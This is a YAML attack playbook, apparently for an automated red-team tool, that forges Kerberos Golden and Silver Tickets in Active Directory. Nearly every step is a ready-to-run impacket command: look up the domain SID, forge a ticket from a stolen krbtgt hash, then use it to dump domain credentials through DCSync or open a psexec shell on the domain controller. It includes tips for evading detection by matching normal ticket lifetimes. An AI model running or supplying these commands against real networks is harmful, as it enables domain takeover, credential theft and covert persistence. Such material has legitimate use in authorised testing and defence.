id: ad-persistence-golden-ticket
name: "AD Persistence — Golden Ticket (krbtgt-signed)"
description: >
  Post-DA: extract the krbtgt NT hash, forge TGTs as any user for any
  service. The ticket is valid until krbtgt is reset TWICE (the rotation
  keeps the old key valid for one cycle). Long-term persistence.
tags: [persistence, golden-ticket, kerberos, post-da, active-directory]
difficulty: hard

inputs:
  - name: domain
    source: target_context.domain
    required: true
  - name: domain_sid
    description: "S-1-5-21-... domain SID."
    required: true
  - name: krbtgt_nt_hash
    description: "NT hash of the krbtgt account (from DCSync)."
    required: true
  - name: impersonate_user
    description: "User to forge a TGT for (typically Administrator)."

steps:
  - id: get_domain_sid
    name: "Look up the domain SID if you don't have it"
    inline_command: "impacket-lookupsid '<domain>/anonymous'@<dc-ip> 0 | head -5"
    notes: |
      Or from a Pwn3d! host: `whoami /user` shows your SID; strip the
      last RID for the domain SID. Or from BloodHound's domain node.

  - id: forge_ticket
    name: "Forge the Golden Ticket"
    inline_command: |
      impacket-ticketer \
        -nthash '<krbtgt_hash>' \
        -domain-sid '<sid>' \
        -domain '<domain>' \
        <user>
    inputs:
      krbtgt_hash: "${krbtgt_nt_hash}"
      sid: "${domain_sid}"
      domain: "${domain}"
      user: "${impersonate_user}"
    notes: |
      Creates `<user>.ccache` in the cwd. Default lifetime is 10 years —
      tune with `-duration`. For lateral discretion, match real ticket
      duration (10 hours).
    capture:
      - var: golden_ccache
        regex: 'Saving ticket in (\S+\.ccache)'
        match: first

  - id: use_ticket
    name: "Use the ticket"
    inline_command: |
      export KRB5CCNAME=<ccache>
      # Verify:
      klist
      # DCSync with the new identity:
      impacket-secretsdump -k -no-pass '<domain>/<user>@<dc-fqdn>'
      # Or shell:
      impacket-psexec -k -no-pass '<domain>/<user>@<dc-fqdn>'
    inputs:
      ccache: "${golden_ccache}"
      domain: "${domain}"
      user: "${impersonate_user}"
    notes: |
      Many CTF/lab setups expect FQDN, not IP, when using Kerberos
      (PKINIT/encryption depends on the SPN matching the host name).
      Add the DC to /etc/hosts if needed: `<dc-ip> <domain> dc.<domain>`.

  - id: silver_ticket_alt
    name: "Or: Silver Ticket (single-service, even stealthier)"
    inline_command: |
      impacket-ticketer \
        -nthash '<service_account_nt_hash>' \
        -domain-sid '<sid>' \
        -domain '<domain>' \
        -spn 'cifs/<target>.<domain>' \
        <user>
    inputs:
      sid: "${domain_sid}"
      domain: "${domain}"
      user: "${impersonate_user}"
    notes: |
      Silver Ticket = TGS for a specific service signed with the service
      account's hash (e.g. MSSQLSvc, cifs, http). No DC interaction at all,
      bypasses krbtgt rotation, but only works for that single SPN.

references:
  - title: "HackTricks — Golden Ticket"
    url:   "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html"
  - title: "The Hacker Recipes — Golden Ticket"
    url:   "https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets"
